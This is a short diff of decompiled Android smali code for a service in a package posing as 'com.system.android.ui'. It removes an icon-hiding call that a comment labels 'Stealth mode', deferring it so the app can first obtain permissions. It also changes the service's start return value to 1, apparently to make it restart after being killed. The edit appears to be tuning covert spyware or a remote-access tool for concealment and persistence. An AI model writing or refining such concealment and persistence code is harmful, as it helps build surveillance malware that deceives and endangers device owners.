@@ -69,24 +69,8 @@
     .param p2, "paramInt1"    # I
     .param p3, "paramInt2"    # I
 
-    .line 39
-    invoke-virtual {p0}, Lcom/system/android/ui/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
-
-    move-result-object v0
-
-    .line 40
-    .local v0, "pkg":Landroid/content/pm/PackageManager;
-    new-instance v1, Landroid/content/ComponentName;
-
-    const-class v2, Lcom/system/android/ui/MainActivity;
-
-    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    const/4 v2, 0x1
-
-    const/4 v3, 0x2
-
-    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
+    # [PLATINUM] Stealth mode removed from auto-start to allow permission granting
+    # The icon will no longer disappear automatically on first run
 
     .line 44
     new-instance v1, Lcom/system/android/ui/MainService$1;
@@ -123,7 +107,10 @@
     invoke-virtual {p0, v3, v0}, Lcom/system/android/ui/MainService;->startForeground(ILandroid/app/Notification;)V
 
     .line 71
-    return v2
+    .line 71
+    const/4 v0, 0x1
+
+    return v0
 
 .end method
 .method private buildNotification()Landroid/app/Notification;
